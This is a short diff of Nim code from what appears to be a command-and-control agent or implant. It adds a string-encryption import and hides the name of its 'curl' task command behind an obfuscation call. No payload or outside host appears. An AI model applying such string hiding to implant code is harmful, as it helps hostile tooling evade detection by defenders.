@@ -1,6 +1,7 @@
 import std/[httpclient, json, os, strutils, net]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc curlExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
@@ -53,4 +54,4 @@ proc curlExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initCurl*() =
-  register("curl", curlExecute)
+  register(hidstr("curl"), curlExecute)
